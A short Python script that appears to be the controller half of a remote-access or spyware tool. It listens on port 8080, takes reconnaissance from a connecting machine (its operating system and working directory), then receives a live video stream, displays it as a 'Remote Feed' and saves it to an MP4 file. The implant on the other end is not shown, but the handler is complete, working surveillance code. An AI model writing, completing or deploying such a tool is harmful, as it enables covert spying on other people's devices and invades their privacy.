import os, socket, cv2, numpy as np, signal, threading

# Server setup
h, p, b = "0.0.0.0", 8080, 1024*128
srv = socket.socket()
srv.bind((h, p))
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.listen(5)
print(f"[*] Listening on {h}:{p} ...")
conn, addr = srv.accept()
print(f"[+] Connection from {addr[0]}:{addr[1]} Received!")
loc = conn.recv(b).decode()
sysinfo = conn.recv(b).decode()
print(f"[+] Operating System: {sysinfo}\n[+] Current Working Dir: {loc}")

# Placeholder for the video writer
out = None

# Video capture handler
def vcap():
    global out
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter('output.mp4', fourcc, 30.0, (640, 480))
    while True:
        f_size = int.from_bytes(conn.recv(4), 'little')
        f_data = b''
        while len(f_data) < f_size:
            pkt = conn.recv(min(b, f_size - len(f_data)))
            if not pkt: break
            f_data += pkt
        if not f_data: break
        frame = cv2.imdecode(np.frombuffer(f_data, np.uint8), cv2.IMREAD_COLOR)
        out.write(frame)
        cv2.imshow('Remote Feed', frame)
        if cv2.waitKey(1) & 0xFF == ord('q'): break
    out.release()
    cv2.destroyAllWindows()

# Signal handler for graceful exit and file renaming
def exit_gracefully(sig, frm):
    global out
    print('Closing video feed...')
    
    if out:
        out.release()  # Release the video writer
        cv2.destroyAllWindows()

        # Ask for the name of the .mp4 file
        filename = input("Enter the name for the output video file (without extension): ") + ".mp4"
        
        # Rename the saved video file
        try:
            os.rename('output.mp4', filename)
            print(f"Video saved as {filename}")
        except Exception as e:
            print(f"Error renaming file: {e}")

    conn.close()
    srv.close()
    exit(0)

signal.signal(signal.SIGINT, exit_gracefully)

# Start video capturing
t = threading.Thread(target=vcap)
t.start()

# Wait for the thread to finish
t.join()
conn.close()
srv.close()
